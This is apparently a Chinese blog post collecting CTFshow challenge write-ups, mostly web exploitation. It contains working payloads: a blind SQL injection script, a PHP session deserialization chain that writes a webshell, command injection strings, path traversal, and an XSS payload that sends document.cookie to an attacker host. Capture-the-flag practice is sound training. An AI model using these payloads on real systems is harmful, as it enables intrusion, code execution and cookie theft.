---
title: CTFshow WEB 刷题记录
date: 2024-08-30 00:00:00 +0800
categories: [刷题记录, ]
tags: [web]
---

[TOC]



# CTFshow

------

## web8

------

仅有三个地方可点，都点进去看看。从URL处可以看到前端是传了一个参数id给后端。

经过一次次测试，总结了如下的过滤列表。

空格
and
逗号
单引号
union

空格可以内联注释来绕过，即 /**/。

and就可以使用or，或者 || ，或者 &&。

过滤逗号, 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用substr(database() from 1 for 1)来代替。

像是单引号被过滤的话，在字符型注入中基本是没戏了，还好这次的是数字型的注入。

而union就可以用 || 或者&&。

```python
import requests

url = 'http://7d646b24-dd1b-4d36-b8a3-7808d462814c.challenge.ctf.show/index.php?id=-1/**/or/**/'
name = ''

# 循环45次( 循环次数按照返回的字符串长度自定义)
for i in range(1, 45):
    # 获取当前使用的数据库
    #payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    # 获取当前数据库的所有表
    #payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    # 获取flag表的字段
    #payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'
    # 获取flag表的数据
    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('正在获取第 %d 个字符' % i)
    # 截取SQL查询结果的每个字符, 并判断字符内容
    for j in range(31, 128):
        result = requests.get(url + payload % (i, j))

        if 'If' in result.text:
            name += chr(j)
            print('数据库名/表名/字段名/数据: %s' % name)
            break

        # 如果某个字符不存在,则停止程序
        count += 1
        if count >= (128 - 31):
            exit()

```

查询了数据库名

![image-20240123145059858](assets/img/2024/1/image-20240123145059858.png)

查询表名,猜测在flag表中

![image-20240123145213281](assets/img/2024/1/image-20240123145213281.png)

查询字段名这里有个要点，table_name=0x666C6167这里是表名等于flag，flag转为十六进制编码形式，0x是十六进制前缀，后面666C6167十六进制转文本时flag。

![image-20240123145336863](assets/img/2024/1/image-20240123145336863.png)

![image-20240123145509848](assets/img/2024/1/image-20240123145509848.png)

------



## 红包题第六弹

------

提示：1.不是SQL注入 2.需要找关键源码

扫描，发现web.zip<img src="assets/img/2024/1/image-20240114152000053.png" alt="image-20240114152000053" style="zoom:50%;" />访问下载web.zip，里边是个名为check.php.bak的文件

```php
function receiveStreamFile($receiveFile){
 
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';
 
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
 
    if($streamData!=''){
        $ret = file_put_contents($receiveFile, $streamData, true);
    }else{
        $ret = false;
    }
 
    return $ret;
 
}
if(md5(date("i")) === $token){
	
	$receiveFile = 'flag.dat';
	receiveStreamFile($receiveFile);
	if(md5_file($receiveFile)===md5_file("key.dat")){
		if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat")){
			$ret['success']="1";
			$ret['msg']="人脸识别成功!$flag";
			$ret['error']="0";
			echo json_encode($ret);
			return;
		}

			$ret['errormsg']="same file";
			echo json_encode($ret);
			return;
	}
			$ret['errormsg']="md5 error";
			echo json_encode($ret);
			return;
} 

$ret['errormsg']="token error";
echo json_encode($ret);
return;
```

发现这里是和key.dat文件进行强碰撞（两个文件的md5值相同，同时sha1值不相同）

------



## 红包题第七弹

------

使用dirsearch扫描，发现/.git/index的一个目录文件，访问下载

python dirsearch.py -u 题目链接 -e php
备注：-u指定url -e指定网站语言
<img src="assets/img/2024/1/image-20240115152101630.png" alt="image-20240115152101630" style="zoom:50%;" />

把index扔到linux下，cat一下，发现一个backdoor.php的目录

![image-20240115152139984](assets/img/2024/1/image-20240115152139984.png)

![image-20240115154705817](assets/img/2024/1/image-20240115154705817.png)

用一下git extract，要POST传参Letmein

![image-20240115154639790](assets/img/2024/1/image-20240115154639790.png)

用蚁剑连接，发现看不了文件<img src="assets/img/2024/1/image-20240115155415273.png" alt="image-20240115155415273" style="zoom:50%;" />

<img src="assets/img/2024/1/image-20240115160633743.png" alt="image-20240115160633743" style="zoom:50%;" />

------



## 萌新专属红包题

------

弱口令登陆，账号admin，密码admin888，用bp抓包

![image-20240115162156436](assets/img/2024/1/image-20240115162156436.png)

发现一串base64密码

![image-20240115162358775](assets/img/2024/1/image-20240115162358775.png)

------



## CTFshow web1

------

先注册一个账号，再登陆。

![image-20240115200858864](assets/img/2024/1/image-20240115200858864.png)

扫一下，发现www.zip

![image-20240115202146418](assets/img/2024/1/image-20240115202146418.png)



------





------

扫一下<img src="assets/img/2024/1/image-20240116144119835.png" alt="image-20240116144119835" style="zoom:50%;" />

发现存在www.zip的网站备份，下载打开，进行php代码审计

一共4个PHP文件，其中index.php有一个当前目录的文件包含，因此可以绕过登入直接查看update.php

```php
<?php
require_once "lib.php";

if(isset($_GET['action'])){
	require_once(__DIR__."/".$_GET['action'].".php");
}
else{
	if($_SESSION['login']==1){
		echo "<script>window.location.href='./index.php?action=update'</script>";
	}
	else{
		echo "<script>window.location.href='./index.php?action=login'</script>";
	}
}
?>
```

/index.php?action=update<img src="assets/img/2024/1/image-20240116145453329.png" alt="image-20240116145453329" style="zoom:50%;" />

update.php

```php
<?php
require_once('lib.php');
echo '<html>
<meta charset="utf-8">
<title>update</title>
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
</html>';
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}

?>
```

可以看到要session[login]=1 ,才能获得flag，转到lib.php

```php
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
```

------



## 红包题 葵花宝典

------

打开题目是一个登录页面，如下图，还有注册的地方。其实看到这种题，基本上sql注入的可能性很大。这道题所用到漏洞是sql约束攻击。<img src="assets/img/2024/1/image-20240202140117269.png" alt="image-20240202140117269" style="zoom:50%;" />

注册一个user,pass。假如数据库对user做了长度限制，当你的用户名超出长度，它会将后面内容截断。
例如root a我们后边输足够多的空格，然后在加一个任意数字或字母数据库就会将后边内容忽略，这时候数据库就会对root用户进行操作。

这道题，它疑似一个后台，那么里边必定有admin或root其中一个账号，对它使用sql约束攻击，即可将它的密码直接改掉(但是这道题似乎注册啥用户都行，只要你用户名 任意数字或字母即可)

注册了一个root账户。首先注册，可以看到在后边输了很多空格后边有个字母，这时操作的用户就是root用户，那么给它设置一个密码，就相当于给root设置了一个密码。设置的密码是123456。点注册<img src="assets/img/2024/1/image-20240202140249219.png" alt="image-20240202140249219" style="zoom:50%;" />登录得到flag

------





------

这道题主要是考察mysql查询绕过的问题。首先访问后看到是一个登录页面，测试注册等无果

扫描目录，发现www.zip，下载看一下：

![image-20240202141611003](assets/img/2024/1/image-20240202141611003.png)

发现这里注册接口处，user防护了，但是password没有防护，再看看登录逻辑，可以看到这里是以admin作为关键字搜索的

那么这里就要说到mysql中where语句的缺陷了，where会忽略空格字符，意味着，"cs"和"cs "对于mysql来说是一样的

这里有一个非常重要的知识点哈，如果分配给CHAR或VARCHAR列的值超过列的最大长度，则对值进行裁剪以使其适合。如果被裁掉的字符不是空格，则会产生一条警告。如果裁剪非空格字符，则会造成错误(而不是警告)并通过使用严格SQL模式禁用值的插入。

但是如果我这个时候禁用了严格SQL模式，那么就会直接截断，不管后面是什么，这个才是这道题的解法。
![image-20240202142438130](assets/img/2024/1/image-20240202142438130.png)

使用对应的账号密码登录即可获得flag

------



## 【nl】难了

------

先审计代码<img src="assets/img/2024/1/image-20240202164056204.png" alt="image-20240202164056204" style="zoom: 67%;" />猜测是RCE读取当前php，要求指令长度小于4。

要小于4，只能用nl读取。Linux中可以将文件名作为函数和参数，通过星号通配执行。先新建一个名称是nl的文件作为指令

?1=>nl

将右尖括号左侧的内容写入右侧文件，因此相当于新建了一个叫nl的空文件。

接着读取当前的php，我们预期是执行`nl xxx.php`，这里由于不知道这个php的名称，无法执行。

?1=*>z

这里的操作是：

根目录下有两个文件：新建的nl和当前的xxx.php
*号代表字符串nl xxx.php，将当前目录下所有文件的名字列出来，(试试echo *就知道了
将其写入一个空文件z
访问该文件就会自动执行字符串nl xxx.php
最后，再次访问http://(环境的url)/z时，可下载php到本地，包含了flag

------



## 一切看起来都那么合情合理

------

通过www.zip下载源代码进行代码审计，因为题目的hint说明了是利用序列化，那就直接找class类。在inc/inc.php里面发现了class类。

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('session.serialize_handler', 'php');//利用点1
date_default_timezone_set("Asia/Shanghai");
session_start();
use \CTFSHOW\CTFSHOW; 
require_once 'CTFSHOW.php';
$db = new CTFSHOW([
    'database_type' => 'mysql',
    'database_name' => 'web',
    'server' => 'localhost',
    'username' => 'root',
    'password' => 'root',
    'charset' => 'utf8',
    'port' => 3306,
    'prefix' => '',
    'option' => [
        PDO::ATTR_CASE => PDO::CASE_NATURAL
    ]
]);

class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));//利用点2
    }
}

```

class类：拥有属性username, password, status

魔术方法 __destruct()：当实例被销毁时触发, 输出username, password, 登陆情况和时间，可利用file_put_contents函数写入一句话

利用session进行序列化执行User类的file_put_contents()函数写入一句话，得到flag

然后查看index.php文件

```php
<?php
    
	error_reporting(0);
	session_start();//开启了session回话
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
	
?>
```

在index.php里面开启了session回话，并且这里的$_SESSION的值我们可以控制。

我们就可以通过$_SESSION的值传递我们的payload入服务器的/tmp/sess_xxx生成我们构造的序列化payload。

然后查看check.php文件

```php
<?php
    
    error_reporting(0);
	require_once 'inc/inc.php';//利用点
    
?>
```

check.php里面最重要的就是require_once 'inc/inc.php'，我们就可以访问check.php进行执行我们构造好的payload
因为该文件包含了inc.php文件，而inc.php文件里面会根据ini_set('session.serialize_handler', 'php');的设置去读取/tmp/sess_xxxx文件里面的内容并且进行反序列化，执行file_put_contents()函数。

可以利用index.php里面的session_start()设置，控制$_SESSION的值（也就是limit）写入我们的payload到服务器的/tmp/sess_xxxx，然后利用inc.php里面的ini_set('session.serialize_handler', 'php')设置去反序列化服务器上的/tmp/sess_xxxx文件，从而执行inc.php里面User类的file_put_contents()函数写入一句话

构造payload

```php
<?php
error_reporting(0);
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
$a =new User("1.php","<?php system('cat fl*');?>");
echo base64_encode(serialize($a));//进行base64编码，因为index.php是进行了base64解码
?>
```

O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:26:"<?php system('cat fl*');?>";s:6:"status";N;}

然后在payload前面添加"|"

|O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:26:"<?php system('cat fl*');?>";s:6:"status";N;}

最后base64编码一下

fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgc3lzdGVtKCdjYXQgZmwqJyk7Pz4iO3M6Njoic3RhdHVzIjtOO30=

然后抓包修改index.php里面的Cookie的limit值。

但是有一个问题就是写入的session马上又会被删除，使用我们利用bp不断的发包然后访问check.php或者inc/inc.php都可以

最后访问log-1.php查看flag<img src="assets/img/2024/1/image-20240202134633824.png" alt="image-20240202134633824" style="zoom:67%;" />

------



## 红包题 耗子尾汁

------

在php当中默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法

传入参数a与b，如果a不在黑名单当中，那么则会调用forward_static_call_array函数

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
function CTFSHOW_36_D($a,$b){
    $dis = array("var_dump","exec","readfile","highlight_file","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","");
    $a = strtolower($a);
    if (!in_array($a,$dis,true)) {
        forward_static_call_array($a,$b);
    }else{
        echo 'hacker';
    }
}
CTFSHOW_36_D($a,$b);
echo "rlezphp!!!"; 
```

forward_static_call_array — Call a static method and pass the arguments as array，也就是可以调用静态方法并且将数组作为参数
payload: a=\system&b[]=ls

![image-20240202184244279](assets/img/2024/1/image-20240202184244279.png)

之后a=\system&b[]=cat flag.php

------



## 新年好?

------

<img src="assets/img/2024/1/image-20240127144335495.png" alt="image-20240127144335495" style="zoom: 67%;" />

重点是在`setTimeout`

setTimeout的意思就是说在一段时间后执行指定的方法，如果超过两个参数的话，会将多的参数当做值传入指定的方法。

也就是说setTimeout(getflag, delay,flag);在delay秒之后，会执行getflag方法，并且会将flag当做参数进行传入

下面的方法，就是说在1000秒之后，就会执行这个匿名方法。

这里需要知道一个知识：浏览器内部使用32位带符号的整数，来储存推迟执行的时间。这意味着setTimeout最多只能推迟执行2147483647毫秒（24.8天）超过这个时间会发生溢出。

如果溢出了之后，相当于从0开始，整数上溢。

payload: /flag?delay=2147483648
![image-20240127144621125](assets/img/2024/1/image-20240127144621125.png)

------



## 红包一

------

在源代码里找到flag。

------



## 萌新赛

------

### 给她

------

git泄露，先用一下githacker

![image-20240301202928617](assets/img/2024/1/image-20240301202928617.png)

[ctfshow 萌新赛 给她_ctfshow 给她-CSDN博客](https://blog.csdn.net/qq_39980334/article/details/127850512)

------



### 签到题

------

<img src="assets/img/2024/1/image-20240301204820858.png" alt="image-20240301204820858" style="zoom:50%;" />

有system函数在，应该就是命令执行了。唯一注意的点就是分号分隔一下。

先?url=;ls;再?url=;cat flag;

------



### 假赛生

------

```php
<?php
session_start();
include('config.php');
if(empty($_SESSION['name'])){
    show_source("index.php");
}else{
    $name=$_SESSION['name'];
    $sql='select pass from user where name="'.$name.'"';
    echo $sql."<br />";
    system('4rfvbgt56yhn.sh');
    $query=mysqli_query($conn,$sql);
    $result=mysqli_fetch_assoc($query);
    if($name==='admin'){
        echo "admin!!!!!"."<br />";
        if(isset($_GET['c'])){
            preg_replace_callback("/\w\W*/",function(){die("not allowed!");},$_GET['c'],1);
            echo $flag;
        }else{
            echo "you not admin";
        }
    }
}
?>
```

https://blog.csdn.net/weixin_52444045/article/details/123101816

------



### 萌新记忆

------

[CTFshow——萌新记忆_ctfshow萌新记忆-CSDN博客](https://blog.csdn.net/weixin_45669205/article/details/114850413)

------



## 36D练手赛

------

### 不知所措.jpg

------

https://www.bing.com/ck/a?!&&p=120868b8eb8fcca1JmltdHM9MTcwOTI1MTIwMCZpZ3VpZD0zYjRlYTUyMi0xYTFiLTY4ZGItMWU4ZC1iNjdiMWI1ODY5YmEmaW5zaWQ9NTE4Nw&ptn=3&ver=2&hsh=3&fclid=3b4ea522-1a1b-68db-1e8d-b67b1b5869ba&psq=ctfshow+%e4%b8%8d%e7%9f%a5%e6%89%80%e6%8e%aa.jpg&u=a1aHR0cHM6Ly93d3cuY29kZW5vbmcuY29tL2NzMTA5NDcwMjQ0Lw&ntb=1

------



## 萌新

------

### web1

------

[ctfshow-萌新-web1( 利用intval函数的特性获取敏感数据)_ctf恢复丢失的敏感数据-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/120190791)

------



### web2

------

?id=2*500

------



### web3

------

?id=2 union select * from article where id = 1000

------



### web4

------

?id=2||id=1000

------



### web5

------

使用取反运算符（~）来控制SQL，获取flag。构造以下payload

```cobol
?id=~~1000
```

------



### web6

------

?id=~~1000

------



### web7

------

进制转换，转换二进制0b开头。/?id=0b001111101000

------



### web8

------

[ctfshow-萌新-web8( 从删库到跑路)_ctf.show_web8-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/120224323)

------



### web9

------

<img src="assets/img/2024/1/image-20240406164928724.png" alt="image-20240406164928724" style="zoom: 50%;" />

cat config.php后查看源码得到flag

------



### web10

------

和上题一样，但过滤了system，用passthru执行命令。

------



### web11

------

和上题一样，过滤了cat，用more查看文件内容

------



### web12

------

和上题一样，但要用base64绕过config过滤

?c=$a = base64_decode('Y29uZmlnLnBocA==');passthru("more $a");

------



### web13

------

源码中过滤了参数中的 system exec highlight cat . ; file php config 等关键字, 这里可以使用 passthru()函数 配合反引号`` 来执行系统命令, 针对分号;的过滤, 我们可以使用 ?> 代替 分号, 首先查看当前目录下的文件

?c=passthru('ls')?>
 接下来读取config.php文件的内容, payload如下

反引号``会将其中的内容当做系统命令来执行, 并返回一个字符串类型的变量用来保存执行结果, 下面的payload会先执行 `ls | grep con*`, 在将结果作为文件名供 more命令查询, 也就是 more config.php

```
?c=passthru("more `ls | grep con*`")?>
```

------



### web14

------

源码中通过GET请求获取参数, 并过滤了参数中的 system exec highlight cat ( . ; file php config 等关键字, 这里有几个比较重要的点

1.过滤了括号( , 函数不能用了, 但仍然可以用反引号``来执行系统命令

2.过滤了分号; , 可以使用?>来代替分号, 但这样一来就只能执行一行代码, 增加了解题的难度

3.源码中的过滤只针对GET请求的参数, 并未对POST请求的参数做限制, 可以利用这一点搞事情

首先我们通过GET请求的参数传递一句话木马, $-POST[a] 接收 POST请求传递的参数, 而后反引号``将接收的参数当做系统命令执行, 由于反引号``执行完成后并不输出结果, 而是返回一个保存执行结果的字符串类型变量, 所以需要使用 echo 来输出这个变量, 从而输出执行结果

```
?c=echo `$_POST[a]`?>
```

![image-20240406172520526](assets/img/2024/1/image-20240406172520526.png)

------



### web15

------

和上一题一样，不过

```
?c=echo `$_POST[a]`;
```

------



### web16

------

可以直接用以下的脚本暴力破解

```python
import hashlib
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
payload=''
for i in str1:
    for j in str1:
        for k in str1:
            s = hashlib.md5(('ctfshow'+i+j+k).encode()).hexdigest()
            #print(type(s))
            if s=='a6f57ae38a22448c2f07f3f95f49c84e':
                print(i+j+k)

```

------



### web17

------

文件包含日志注入漏洞

日志位置/var/log/nginx/access.log

------



### web18-21

------

同上题

------



### web22

------



------



## 获得百分之百的快乐

------

```php
<?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])<4){
     echo shell_exec($_GET[1]);
}
else{
     echo "hack!!!";
}
?>
```

`nl>`：创建一个nl空文件。
`*`： 以当前路径下第一个文件名作为命令执行。
比如：目录下第一个文件叫做`ss.txt`的文件，文件内容为:`123455`。这个时候我执行`>nl`，然后在执行*，就会把`ss.txt`内容进行输出，如果我在当前页面执行`>nl`和`*`就会把`ss.txt`的内容输出到当前页面。

<img src="assets/img/2024/1/image-20240525172639304.png" alt="image-20240525172639304" style="zoom: 50%;" />

nl，*后查看页面源代码就能得到flag。

------



## 西瓜杯

------

### WEB

------

#### CodeInject

```php
<?php

#Author: h1xa

error_reporting(0);
show_source(__FILE__);

eval("var_dump((Object)$_POST[1]);");
```

直接闭合即可，post传`1=1);system("cat /000f1ag.txt");//`，即变成`eval("var_dump((Object)1);system("ls /");//;");`

------



#### tpdoor

[(・ω< )★XGCTF西瓜杯 | 雲流のLowest World (c1oudfl0w0.github.io)](https://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF西瓜杯/)

------



#### NewerFileDetector

这个题需要在浏览器访问  pwn.challenge.ctf.show:28158 

这种请示访问

考点

1. `magika`代码审计
2. `os.path.join`绝对路径覆盖

3. 简单`XSS`

bot 是先通过 check 检测是否为 VIP ，如果是 VIP 则会把 flag 放在 cookie 里并访问 http://localhost:5050/share?file={link} 。而 cookie 的设置了 domain 为 localhost ，因此我们需要找一个靶机的 xss ，而 httpOnly 设置为 False 意味着直接通过 document.cookie 即可拿到 flag 。

分析`app.py`，`/upload`路由可以任意上传文件，`/check`路由通过读取 `vip.json`来检查是否为vip。

```python
def check():
	path = os.path.join(CHECK_FOLDER,"vip.json")             #join
	if os.path.exists(path):
		content = open(path,"r").read()
		try:
			isSVIP = ast.literal_eval(json.loads(content)["isSVIP"])
		except:
			isSVIP = False
		return "VIP" if isSVIP else "GUEST"
	else:
		return "GUEST"
```

这里使用了 ast.literal_eval 这样一个比较怪的写法来取 isSVIP 字段。 登陆成功后会将 session 写到 /app/check/vip.json 中，然而 vip_pwd 不可能猜出来，因此 isSVIP 始终为 False 。

```python
def login():
    if(session.get("isSVIP")):
        return "logined"
    if request.method == "GET":
        return "input your username and password plz"
    elif request.method == "POST":
        try:
            user = request.form.get("username").strip()
            pwd = request.form.get("password").strip()
            if user == vip_user and pwd == vip_pwd:
                session["isSVIP"] = "True"
            else:
                session["isSVIP"] = "False"
            # 写入硬盘中，方便bot验证。
            file = os.path.join(CHECK_FOLDER,"vip.json") 
            with open(file,"w") as f:
                json.dump({k: v for k, v in session.items()},f)
                f.close()
            return f"{user} login success"
        except:
            return "you broke the server,get out!"
```

那么题目的思路就是先上传一个 `vip.json`来覆盖掉旧的`vip.sjon`，从而通过`/check`，接着再上传一个html，实现xss。

```python
@app.route("/upload",methods = ["POST"])      
def upload():   
    try:
        content = request.form.get("content").strip()
        name = request.form.get("name").strip()
        file_type = mg.identify_bytes(content.encode()).output.ct_label #判断文件内容
        if isSecure(file_type):
            file = os.path.join(USER_FOLDER,name) 
            with open(file,"w") as f:
                f.write(content)
            f.close()
            return "ok,share your link to bot: /visit?link=user/"+ name
        return "black!"
    except:
        return "you broke the server,fuck out!"
```

首先是 mg.identify_bytes(content.encode()).output.ct_label ，该函数功能为调用深度学习模型， 根据文件内容来预测文件类型。如果预测值不在 ["json",'py','sh', "html"] 中则可以上传文件。这里比较明显的一点 是 os.path.join(USER_FOLDER,name) ，其中 name 可控，因此我们可以把 name 设置为绝对路径从而变成 一个任意文件上传。 现在只有一个问题，就是如何让 magika 的预测判断失误， json.loads(content) 限制了我们必须传一个 json 。 identify_bytes代码审计 审计一下 identify_bytes ，发现会调用 _get_result_or_features_from_bytes 。

```python
    def _get_result_from_bytes(self, content: bytes) -> StatusOr[MagikaResult]:
        result, features = self._get_result_or_features_from_bytes(content)
        if result is not None:
            return result
        assert features is not None
        return self._get_result_from_features(features)#
```

跟进，注意到如果文件内容长度小于 _min_file_size_for_dl 则会调用 _get_result_of_few_bytes 。

```python
    def _get_result_or_features_from_bytes(
        self, content: bytes
    ) -> Tuple[Optional[MagikaResult], Optional[ModelFeatures]]:
        if len(content) == 0:
            output = self._get_result_from_labels_and_score(
                Path("-"),
                dl_ct_label=None,
                output_ct_label=ContentType.EMPTY,
                score=1.0,
            )
            return output, None

        elif len(content) <= self._min_file_size_for_dl:
            output = self._get_result_of_few_bytes(content)#
            return output, None

        else:
            file_features = Magika._extract_features_from_bytes(
                content,
                self._input_sizes["beg"],
                self._input_sizes["mid"],
                self._input_sizes["end"],
                self._padding_token,
                self._block_size,
            )
            # Check whether we have enough bytes for a meaningful
            # detection, and not just padding.
            if file_features.beg[self._min_file_size_for_dl - 1] == self._padding_token:
                # If the n-th token is padding, then it means that,
                # post-stripping, we do not have enough meaningful
                # bytes.
                output = self._get_result_of_few_bytes(content)
                return output, None

            else:
                # We have enough bytes, scheduling this file for model
                # prediction.
                # features.append((path, file_features))
                return None, file_features

        raise Exception("unreachable")
```

再跟进就会发现 _get_result_of_few_bytes 是一个摆烂函数，直接返回 ContentType.GENERIC_TEXT （ ContentType.GENERIC_TEXT 硬编码为 txt ）。

```python
    def _get_result_of_few_bytes(
        self, content: bytes, path: Path = Path("-")
    ) -> MagikaResult:
        assert len(content) <= 4 * self._block_size
        ct_label = self._get_ct_label_of_few_bytes(content)#
        return self._get_result_from_labels_and_score(
            path, dl_ct_label=None, output_ct_label=ct_label, score=1.0
        )

    def _get_ct_label_of_few_bytes(self, content: bytes) -> str:
        try:
            ct_label = ContentType.GENERIC_TEXT#
            _ = content.decode("utf-8")
        except UnicodeDecodeError:
            ct_label = ContentType.UNKNOWN
        return ct_label
```

接着查找长度，跟进 `_min_file_size_for_dl` ，最终发现它的值是从文件里读取的。

```python
def _get_magika_config() -> Dict[str, Any]:
    config_path = Path(__file__).parent / "config" / "magika_config.json"
    return json.loads(config_path.read_text())  # type: ignore[no-any-return]
```

去找这个文件看看。

<img src="assets/img/2024/1/image-20240802152918875.png" alt="image-20240802152918875" style="zoom: 67%;" />

可以得到 `_min_file_size_for_dl` 的值是 16 ，也就是说，只要我们文本的内容长度少于16，就不会对文件进行检测。

在`/check`路由中，对vip的判断是`"VIP" if isSVIP else "GUEST"`，只要 `isSVIP`不为空或者不是 `False`，即可通过判断。

没有过滤 `..` ，可以用相对路径跳回根目录再接着往下写。

```
/upload

POST:
name=../../../../app/check/vip.json&content={"isSVIP":"1"}
```

访问 `/ckeck`，已经成为 vip 了

<img src="assets/img/2024/1/image-20240802154917985.png" alt="image-20240802154917985" style="zoom:67%;" />

XSS 的话我们上传一个 html 到靶机中即可。

```
/upload

POST:
name=1.html&content=<script>fetch("http://[ip:port]/?flag="%2bdocument.cookie)</script>
```

![image-20240802175346333](assets/img/2024/1/image-20240802175346333.png)

------



### RE

------

#### pe

拖进IDA看见flag

------



#### 一个西瓜切两半你一半我一半

python逆向

```python
flag = 'ctfshow{this_is_fake_flag}'
key = '这是假的密钥'
tmp = ''
for i in flag:
    tmp += chr(ord(i) - 32)

crypt = ''
for i in range(len(tmp)):
    crypt += chr(ord(tmp[i]) + ord(key[i % len(key)]))

print(crypt)
```

附件里密文是`乃乾觅甯剏乳厡侻丨厏扝乌博丿乜规甲剌乶厝侥丿卻扚丠厘丿乎覟瓬剤`，密钥是`一个西瓜切两半你一半我一半`

脚本

```python
crypt = '乃乾觅甯剏乳厡侻丨厏扝乌博丿乜规甲剌乶厝侥丿卻扚丠厘丿乎覟瓬剤'
key = '一个西瓜切两半你一半我一半'
tmp = ''
flag = ''

for i in range(len(crypt)):
    tmp += chr(ord(crypt[i]) - ord(key[i % len(key)]))

for i in tmp:
    flag += chr(ord(i) + 32)

print(flag)
```

------



#### 探索进制的奥秘

IDA打开，将16进制转换为字符

------



